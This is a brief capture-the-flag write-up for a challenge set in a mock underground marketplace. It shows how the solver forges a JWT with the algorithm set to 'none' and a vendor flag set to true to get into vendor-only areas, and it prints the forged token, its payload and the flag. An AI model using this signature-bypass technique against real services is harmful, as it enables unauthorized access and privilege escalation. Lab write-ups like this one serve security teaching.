# The Vendor's Secret Door

## Description

You're browsing the underground marketplace, but you're just a regular buyer. Some users claim they've found a way to access vendor-only areas. Can you figure out how?

## Solution Walkthrough

After logging in, I discovered a JWT, so I first tried to see if I could change the `alg` to `None`, and it worked.

`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6Img5aXhrdyIsImVtYWlsIjoiYUBhIiwiaXNWZW5kb3IiOnRydWUsImlhdCI6MTc4MTg3MDM2MiwiZXhwIjoxNzgyNDc1MTYyfQ.`

```json
{
  "id": "h9ixkw",
  "email": "a@a",
  "isVendor": true,
  "iat": 1781870362,
  "exp": 1782475162
}
```

After modifying it, I was able to get the flag.

![alt text](image.png)

## Flag

```text
bitflag{jwt_5h4ll_n0t_p455}
```
